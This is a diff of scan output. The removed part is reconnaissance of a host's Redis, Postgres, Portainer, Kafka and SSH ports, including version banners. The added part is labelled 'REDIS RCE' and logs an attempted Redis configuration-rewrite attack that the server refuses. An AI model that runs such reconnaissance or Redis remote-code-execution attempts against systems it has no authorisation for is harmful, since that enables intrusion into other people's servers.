@@ -1,11 +1,21 @@
-=== REDIS 6379 (hung1) ===
-PING: b'+PONG\r\n'
-INFO: b'$625\r\n# Server\r\nredis_version:7.4.9\r\nredis_git_sha1:00000000\r\nredis_git_dirty:0\r\nredis_build_id:b4acab9aea09546d\r\nredis_mode:standalone\r\nos:Linux 7.0.0-31-generic x86_64\r\narch_bits:64\r\nmonotonic_clock'
-=== PG 5432 ===
-=== PORTAINER 9000 ===
+=== REDIS RCE ===
+DIR: *2
+$3
+dir
+$5
+/data
 
-=== KAFKA 9092 ===
+DBFILE: *2
+$10
+dbfilename
+$8
+dump.rdb
 
-=== SSH BANNER ===
-SSH-2.0-OpenSSH_10.2p1 Ubuntu-2ubuntu3.6
-DOCKER-SRV
+DIR-SET: -ERR CONFIG SET failed (possibly related to argument 'dir') - can't set protected config
+
+DB-SET: -ERR CONFIG SET failed (possibly related to argument 'dbfilename') - can't set protected config
+
+KEY-SET: -ERR Protocol error: unbalanced quotes in request
+
+SAVE: 
+REDIS-RCE-DONE
